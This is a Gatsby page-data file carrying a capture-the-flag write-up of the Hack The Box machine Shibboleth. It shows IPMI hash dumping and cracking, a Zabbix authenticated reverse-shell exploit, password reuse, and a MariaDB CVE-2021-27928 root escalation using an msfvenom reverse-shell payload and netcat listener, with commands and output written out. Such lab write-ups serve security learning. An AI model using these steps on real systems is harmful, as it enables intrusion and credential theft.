{
    "componentChunkName": "component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx",
    "path": "/hack-the-box-shibboleth-writeup",
    "result": {"data":{"post":{"slug":"/hack-the-box-shibboleth-writeup","title":"Hack the Box Shibboleth Writeup","date":"24.03.2022","tags":[{"name":"Shibboleth","slug":"shibboleth"}],"description":null,"canonicalUrl":null,"body":"var _excluded = [\"components\"];\n\nfunction _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsxRuntime classic */\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Hack the Box Shibboleth Writeup\",\n  \"date\": \"2022-03-24T00:00:00.000Z\",\n  \"tags\": [\"Shibboleth\"]\n};\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, _excluded);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"75.83333333333333%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACxElEQVQ4y32Ty4scVRSHZxMlmPT0VHVVv+t5H/XqenTPTJyAGzeCogRBCUEwSDbZhGCmk3FiZogomMlGcCWS/8ilKxf5V75w79gSdZjFj3vurXs+fueeU1s7Y81F6o8Uzljznq+54khGc4U/L3CDhlHSMRZLnLjDTzomaYcbtnjziq3LYYpCCZ58seDZ7QWLsqQXdExlh5Mu2REr+umKoVgyTDqcsP0/8B+Yp6kyyaNvPuHW0RmfHZ2xvvcpddvgJLv01S7bao+e2mMgV/jpEifqLnboTjTv7Eju3+q4fXjCvVdn3P31lC8ffsfhnX1GUUWcNwS6Zq4WRLIiEiVufAnw3R3B/c/3eP7TQ/787YA/TgRPH99l/dX7JLGgyjNKrSmkIBeCTEq85JKSr/mapsx5tf6Qv3454PWp4vcHN/ngRoNUGUWeIYRmHkqCUCJThRf/B2hgm/W6l3LVFbS54OXXOT/eyVl1NeO4REpFEBd4Y0UkGlQqUULhRc3FDgezHFXfZC5a/HiFFzYEaYkTLNFFx6rrSFVFkmQomdlytVAMgtoAjauNND1fME1bTn54wYNHT+367PnPnH5/zNH6kMdPjjlef0uRGZAiSwUqEcShZBblbPVHxtXbUnYdhgtGYc0kaZkmHbN0SVl1lFVLKitEqkljRRopwlARxtq6tQ4HgcKz0jY2cmcSdy7p+ZLmoyntxxMbT2KJ0IqizCgroxxdZATp+XRYoDPRtuT+WNr4fC/pj4SFiP0YfRDT8xXbpnETxWCqGUwlzljYvL7N1+dN6Q9NIwqGYW1jU/Y4bgnUHjPze/kF11zNLK0JRI07zS14GDbM5C6TpLP5Js8Ct4eSUbRgLpf20OynSYuoDkiKG7jTzAJioclyZUvbTEOS79t37v89JVtvz54BbcbHxKbjRud3FL2h4rqv/jWv5ru5uzl7A90st7MgAl/qAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"Shibboleth\",\n    \"title\": \"Shibboleth\",\n    \"src\": \"/blogs/static/7f6f741fbe6efb8791607d401105800a/7d769/Shibboleth.png\",\n    \"srcSet\": [\"/blogs/static/7f6f741fbe6efb8791607d401105800a/5243c/Shibboleth.png 240w\", \"/blogs/static/7f6f741fbe6efb8791607d401105800a/ab158/Shibboleth.png 480w\", \"/blogs/static/7f6f741fbe6efb8791607d401105800a/7d769/Shibboleth.png 960w\", \"/blogs/static/7f6f741fbe6efb8791607d401105800a/4af54/Shibboleth.png 1400w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"h3\", null, \"Port Scanning\"), mdx(\"p\", null, \"Using rustscan, I first found the open tcp ports very fast.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot Hackthebox/Shibboleth \\xBB rustscan -a 10.10.11.124\\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\\\ |  `| |\\n| .-. \\\\| {_} |.-._} } | |  .-._} }\\\\     }/  /\\\\  \\\\| |\\\\  |\\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\\nThe Modern Day Port Scanner.\\n________________________________________\\n: https://discord.gg/GFrQsGy           :\\n: https://github.com/RustScan/RustScan :\\n --------------------------------------\\n\\uD83D\\uDE35 https://admin.tryhackme.com\\n\\n[~] The config file is expected to be at \\\"/home/malworm/.rustscan.toml\\\"\\n[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers\\n[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. \\nOpen 10.10.11.124:80\\n\")), mdx(\"p\", null, \"Only port 80 is open, which is default for http service. In \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/etc/hosts\"), \", add hostname for \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"10.10.11.124\"), \". \"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"sudo nano /etc/hosts\\nNow add this: 10.10.11.124  shibboleth.htb\\n\")), mdx(\"h3\", null, \"Service Scanning\"), mdx(\"p\", null, \"Now lets visit the site and simultaneously run \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"nmap\"), \" on port 80 to find the http service details.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot Hackthebox/Shibboleth \\xBB nmap -p 80 -sCV 10.10.11.124                                                                                                                     130 \\u21B5\\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-31 07:59 BST\\nNmap scan report for 10.10.11.124\\nHost is up (0.10s latency).\\n\\nPORT   STATE SERVICE VERSION\\n80/tcp open  http    Apache httpd 2.4.41\\n|_http-title: Did not follow redirect to http://shibboleth.htb/\\n|_http-server-header: Apache/2.4.41 (Ubuntu)\\nService Info: Host: shibboleth.htb\\n\")), mdx(\"p\", null, \"On visiting the webisite, nothing seems to strike that can be exploited. So I used \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ffuf\"), \" to perform dir/file scan.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot Documents/Hackthebox \\xBB ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://shibboleth.htb/FUZZ -fc 404 \\n\\n        /'___\\\\  /'___\\\\           /'___\\\\       \\n       /\\\\ \\\\__/ /\\\\ \\\\__/  __  __  /\\\\ \\\\__/       \\n       \\\\ \\\\ ,__\\\\\\\\ \\\\ ,__\\\\/\\\\ \\\\/\\\\ \\\\ \\\\ \\\\ ,__\\\\      \\n        \\\\ \\\\ \\\\_/ \\\\ \\\\ \\\\_/\\\\ \\\\ \\\\_\\\\ \\\\ \\\\ \\\\ \\\\_/      \\n         \\\\ \\\\_\\\\   \\\\ \\\\_\\\\  \\\\ \\\\____/  \\\\ \\\\_\\\\       \\n          \\\\/_/    \\\\/_/   \\\\/___/    \\\\/_/       \\n\\n       v1.3.1 Kali Exclusive <3\\n________________________________________________\\n\\n :: Method           : GET\\n :: URL              : http://shibboleth.htb/FUZZ\\n :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\\n :: Follow redirects : false\\n :: Calibration      : false\\n :: Timeout          : 10\\n :: Threads          : 40\\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\\n :: Filter           : Response status: 404\\n________________________________________________\\n\\n.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]\\n.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]\\n.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10]\\nassets                  [Status: 301, Size: 317, Words: 20, Lines: 10]\\nforms                   [Status: 301, Size: 316, Words: 20, Lines: 10]\\nindex.html              [Status: 200, Size: 59474, Words: 17014, Lines: 1324]\\nserver-status           [Status: 403, Size: 279, Words: 20, Lines: 10]\\n\")), mdx(\"p\", null, \"This too couldn't give me any useful information. So this left me with last option to perform subdomain fuzz,\\nFor this too I used  \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ffuf\"), \". \"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot Security/HackTheBox \\xBB ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shibboleth.htb -H \\\"Host:FUZZ.shibboleth.htb\\\" -mc all -fc 400,404,302\\n\\n        /'___\\\\  /'___\\\\           /'___\\\\       \\n       /\\\\ \\\\__/ /\\\\ \\\\__/  __  __  /\\\\ \\\\__/       \\n       \\\\ \\\\ ,__\\\\\\\\ \\\\ ,__\\\\/\\\\ \\\\/\\\\ \\\\ \\\\ \\\\ ,__\\\\      \\n        \\\\ \\\\ \\\\_/ \\\\ \\\\ \\\\_/\\\\ \\\\ \\\\_\\\\ \\\\ \\\\ \\\\ \\\\_/      \\n         \\\\ \\\\_\\\\   \\\\ \\\\_\\\\  \\\\ \\\\____/  \\\\ \\\\_\\\\       \\n          \\\\/_/    \\\\/_/   \\\\/___/    \\\\/_/       \\n\\n       v1.4.0-dev\\n________________________________________________\\n\\n :: Method           : GET\\n :: URL              : http://shibboleth.htb\\n :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\\n :: Header           : Host: FUZZ.shibboleth.htb\\n :: Follow redirects : false\\n :: Calibration      : false\\n :: Timeout          : 10\\n :: Threads          : 40\\n :: Matcher          : Response status: all\\n :: Filter           : Response status: 400,404,302\\n________________________________________________\\n\\nmonitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 110ms]\\nmonitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 101ms]\\nzabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 105ms]\\n\")), mdx(\"p\", null, \"Fortunately, this immediately gave me 3 subdomains!. Add these to /etc/hosts to open them on browse.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb shibboleth.htb\\n\")), mdx(\"p\", null, \"Now jump into the browser to explore these subdomains.\\nOn opening them, I found that all three are actually the same, and it could also be realized earlier by seeing that\\nall three return same size and words. Anyway, what we have got is a Zabbix monitoring service. On searching for zabbix\\non google, I found several vulnerabilities like cross-site scripting, zabbix_ID cookie exploit etc. in different versions\\nof the service.\\nBut the problem was I couldn't find the version of zabbix this site was using to this led to nowhere.\\nAfter some waste attempts, UDP port struck me. It is common thing to overlook UDP ports sometimes.\"), mdx(\"h3\", null, \"UDP Port Scan\"), mdx(\"p\", null, \"I used nmap to scan the UDP ports. It took long time to perform scan on all the ports, but I got something :).\"), mdx(\"h3\", null, \"Exploiting IPMI\"), mdx(\"p\", null, \"I searched for asf-rpmc service and luckily, third \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://book.hacktricks.xyz/pentesting/623-udp-ipmi\"\n  }, \"link\"), \" talked about IPMI service exploit.\\n\", mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"88.33333333333333%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsTAAALEwEAmpwYAAABqElEQVQ4y42TiY7cIBBE5/8/MsoqG9scxlzdzdHYkWHnyGQmSQkhjPzcRbm5BBes0XtlSslZ65xj5uM49qse18w1p4LE7dw+LgnJe39ucyUiRKy1cj1VypgL87nRWusLplS4tRM+rgrEW8iEmFKGCIiUKJVSIkDu6iZO5VKGo8vNG+UcYogAQIiEpebjX+qV+yejheW7nr4p8WHW2akfdp28W8AJdBK9Ai+RK+83A4+2E6VVbZuxYlFamVX3oYxc9GZcDBA9nLZSegGXUkMIEeIYpWsE1no8b2yPGHIOIcYYEfHd22/hGMI0zdM0CymZ2/67Hpnb4x1GQGOMdRaJ/l6wtfb1q+6VYxRSrqsZkezvxczPMDPnXHL+imcf/Fg8jNYaEj3DpRQAQATsLfU/md1h79P06ebJ/fx0WsEywapTuwY3znk77R+BUdo2Z61XapNSS7lqvVlr19UorUOIo89rrS9gIrJ2c9Z57/F0j30GZn4q+AIGR/LDrrO3MjgNZg5mCgiJuyqPa1qZ28smifMsxCKFUFKoeRJSqBiBiM6ehmEEcy43+BcS1B018naz5QAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"asf-rpmc\",\n    \"title\": \"asf-rpmc\",\n    \"src\": \"/blogs/static/957499170f601f94ee06ccaedbad03f7/7d769/asf-search.png\",\n    \"srcSet\": [\"/blogs/static/957499170f601f94ee06ccaedbad03f7/5243c/asf-search.png 240w\", \"/blogs/static/957499170f601f94ee06ccaedbad03f7/ab158/asf-search.png 480w\", \"/blogs/static/957499170f601f94ee06ccaedbad03f7/7d769/asf-search.png 960w\", \"/blogs/static/957499170f601f94ee06ccaedbad03f7/e9794/asf-search.png 1009w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"using msfconsole, I found that the service was using Ciper-0 suite. I started with exploiting Ciper-0 but realized that\\nin the end I would require ssh servie which is not available on this machine.\\nSo I looked on next link which exploited the service by grabbing hashes using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ipmi_dumphahes\"), \" module.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"msfconsole\\nuse auxiliary/scanner/ipmi/ipmi_dumphahes\\nset RHOSTS 10.10.11.124\\nrun\\n\")), mdx(\"p\", null, \"Very quickly, I got the hash.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run\\n\\n[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:724ed08782050000027e5803290ef23554d3f32eaea7b9ded33b5ec5c19dfe450860a449a90e24b8a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:141be421e0266850bed045aa16d590f731c5fdb0\\n[*] Scanned 1 of 1 hosts (100% complete)\\n[*] Auxiliary module execution completed\\n\\n\")), mdx(\"h3\", null, \"Cracking Hash\"), mdx(\"p\", null, \"Next step is to crack the hash using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"hashcat\"), \". First I needed hash type code for using hashcat. On \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://hashcat.net/wiki/doku.php?id=example_hashes\"\n  }, \"this\"), \"\\npage search for \", mdx(\"em\", {\n    parentName: \"p\"\n  }, \"ipmi\"), \", and we get the code - 7300\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot HackTheBox/Shibboleth \\xBB hashcat -m 7300 hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt                                                     130 \\u21B5\\nhashcat (v6.1.1) starting...\\n\\nOpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\\n=============================================================================================================================\\n* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 13722/13786 MB (4096 MB allocatable), 12MCU\\n\\nMinimum password length supported by kernel: 0\\nMaximum password length supported by kernel: 256\\n\\nHashes: 1 digests; 1 unique digests, 1 unique salts\\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\\nRules: 1\\n\\nApplicable optimizers applied:\\n* Zero-Byte\\n* Not-Iterated\\n* Single-Hash\\n* Single-Salt\\n\\nATTENTION! Pure (unoptimized) backend kernels selected.\\nUsing pure kernels enables cracking longer passwords but for the price of drastically reduced performance.\\nIf you want to switch to optimized backend kernels, append -O to your commandline.\\nSee the above message to find out about the exact limits.\\n\\nWatchdog: Hardware monitoring interface not found on your system.\\nWatchdog: Temperature abort trigger disabled.\\n\\nHost memory required for this attack: 67 MB\\n\\nDictionary cache built:\\n* Filename..: /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt\\n* Passwords.: 14344391\\n* Bytes.....: 139921497\\n* Keyspace..: 14344384\\n* Runtime...: 1 sec\\n\\n724ed08782050000027e5803290ef23554d3f32eaea7b9ded33b5ec5c19dfe450860a449a90e24b8a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:141be421e0266850bed045aa16d590f731c5fdb0:ilovepumkinpie1\\n                                                 \\nSession..........: hashcat\\nStatus...........: Cracked\\nHash.Name........: IPMI2 RAKP HMAC-SHA1\\nHash.Target......: 724ed08782050000027e5803290ef23554d3f32eaea7b9ded33...c5fdb0\\nTime.Started.....: Mon Apr  4 20:25:06 2022 (2 secs)\\nTime.Estimated...: Mon Apr  4 20:25:08 2022 (0 secs)\\nGuess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)\\nGuess.Queue......: 1/1 (100.00%)\\nSpeed.#1.........:  3946.9 kH/s (1.56ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\\nRecovered........: 1/1 (100.00%) Digests\\nProgress.........: 7397376/14344384 (51.57%)\\nRejected.........: 0/7397376 (0.00%)\\nRestore.Point....: 7385088/14344384 (51.48%)\\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\\nCandidates.#1....: iloveyoo4lyfee987412800224656227599 -> ilovemymum55\\n\")), mdx(\"p\", null, \"Yay we got the password for \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Administrator\"), \" account!\"), mdx(\"h3\", null, \"Post Authentication Exploit\"), mdx(\"p\", null, \"After logging in, we get a very complex website, and no opening some links I couldn't make you much sense of it.\\nSo I googled \", mdx(\"em\", {\n    parentName: \"p\"\n  }, \"zabbix post authentication exploit\"), \", and \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://www.exploit-db.com/exploits/50816\"\n  }, \"first search result\"), \" gave me reverse-shell exploit for zabbix 5.0.17.\\nI confirmed that I was using the same version.\\nOn running this exploit file, I got the shell. \"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot HackTheBox/Shibboleth \\xBB python3 50816.py http://monitor.shibboleth.htb Administrator ilovepumkinpie1 10.10.14.13 8081                                   255 \\u21B5\\n[*] this exploit is tested against Zabbix 5.0.17 only\\n[*] can reach the author @ https://hussienmisbah.github.io/\\n[+] the payload has been Uploaded Successfully\\n[+] you should find it at http://monitor.shibboleth.htb/items.php?form=update&hostid=10084&itemid=33618\\n[+] set the listener at 8081 please...\\n[?] note : it takes up to +1 min so be patient :)\\n[+] got a shell ? [y]es/[N]o: y\\nNice !\\n\")), mdx(\"p\", null, \"I used this command to upgrade my shell.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"python3 -c \\\"import pty; pty.spawn('/bin/bash')\\\" \\n\")), mdx(\"p\", null, \"I got shell as \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"zabbix\"), \" user. \"), mdx(\"h3\", null, \"Owning The User\"), mdx(\"p\", null, \"This phase was quite frustrating for me as I ran linpeas as spent few hours looking for some vulnerability until I found that\\nuser \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ipmi-svc\"), \" had the same password as zabbix.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"su ipmi-svc\\ncd\\ncat user.txt\\n\")), mdx(\"p\", null, \"And I got the user flag!\"), mdx(\"h3\", null, \"Owning The System\"), mdx(\"p\", null, \"Earlier I found that system had mysql service running on port 3306 using MariaDB and also that the system had nmap installed. I ran it on localhost to find versions of mysql and mariadb.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"ipmi-svc@shibboleth:/tmp/malworm$ nmap -sCV 127.0.0.1\\nnmap -sCV 127.0.0.1\\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-04-04 21:14 BST\\nNmap scan report for localhost (127.0.0.1)\\nHost is up (0.00012s latency).\\nNot shown: 998 closed ports\\nPORT     STATE SERVICE VERSION\\n80/tcp   open  http    Apache httpd 2.4.41\\n|_http-server-header: Apache/2.4.41 (Ubuntu)\\n|_http-title: Did not follow redirect to http://shibboleth.htb/\\n3306/tcp open  mysql   MySQL 5.5.5-10.3.25-MariaDB-0ubuntu0.20.04.1\\n| mysql-info: \\n|   Protocol: 10\\n|   Version: 5.5.5-10.3.25-MariaDB-0ubuntu0.20.04.1\\n|   Thread ID: 430\\n|   Capabilities flags: 63486\\n|   Some Capabilities: Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, Support41Auth, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, ODBCClient, SupportsCompression, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments\\n|   Status: Autocommit\\n|   Salt: `Dp*{Rg0T:dh_#-Z]D{b\\n|_  Auth Plugin Name: mysql_native_password\\n\")), mdx(\"p\", null, \"I also got the password for mysql database in linpeas output log.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"-rw-r----- 1 root ipmi-svc 21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf\\nLogFile=/var/log/zabbix/zabbix_server.log\\nLogFileSize=0\\nPidFile=/run/zabbix/zabbix_server.pid\\nSocketDir=/run/zabbix\\nDBName=zabbix\\nDBUser=zabbix\\nDBPassword=bloooarskybluh\\nSNMPTrapperFile=/var/log/snmptrap/snmptrap.log\\nTimeout=4\\nAlertScriptsPath=/usr/lib/zabbix/alertscripts\\nExternalScripts=/usr/lib/zabbix/externalscripts\\nFpingLocation=/usr/bin/fping\\nFping6Location=/usr/bin/fping6\\nLogSlowQueries=3000\\nStatsAllowedIP=127.0.0.1\\n\")), mdx(\"p\", null, \"Using this I logged into mysql service but didn't find anything worth.\\nI searched for exploits of mysql 5.5.5 and tried some cve like \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"CVE-2016-6663\"), \" but they required mysql user to execute\\nthe exploit. Then I searched for mariadb 10.3.25 exploit and found one easily \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/Al1ex/CVE-2021-27928\"\n  }, \"here\"), \".\\nThen I generated the payload using msfvenom and I got the root shell!! \"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot HackTheBox/Shibboleth \\xBB msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f elf-so -o cve-2021-27928.so                               1 \\u21B5\\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\\n[-] No arch selected, selecting arch: x64 from the payload\\nNo encoder specified, outputting raw payload\\nPayload size: 74 bytes\\nFinal size of elf-so file: 476 bytes\\nSaved as: cve-2021-27928.so\\n\")), mdx(\"p\", null, \"I uploaded the .so file using python http server.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"MariaDB [zabbix]> SET GLOBAL wsrep_provider=\\\"/tmp/rand2/cve-2021-27928.so\\\";\\nSET GLOBAL wsrep_provider=\\\"/tmp/rand2/cve-2021-27928.so\\\";\\nERROR 2013 (HY000): Lost connection to MySQL server during query\\n\")), mdx(\"p\", null, \"Started listener on my local machine on port 4444.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"malworm@parrot HackTheBox/Shibboleth \\xBB nc -lnvp 4444        \\nlistening on [any] 4444 ...\\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.11.124] 57820\\nid\\nuid=0(root) gid=0(root) groups=0(root)\\npwd\\n/var/lib/mysql\\ncd /root\\ncat root.txt\\n\")), mdx(\"p\", null, \"And the machine is pwned :)) \"));\n}\n;\nMDXContent.isMDXComponent = true;","excerpt":"Port Scanning Using rustscan, I first found the open tcp ports very fast. Only port 80 is open, which is default for http service. In  /etc…","timeToRead":2,"banner":null}},"pageContext":{"slug":"/hack-the-box-shibboleth-writeup","formatString":"DD.MM.YYYY"}},
    "staticQueryHashes": ["2744905544","3090400250","318001574"]}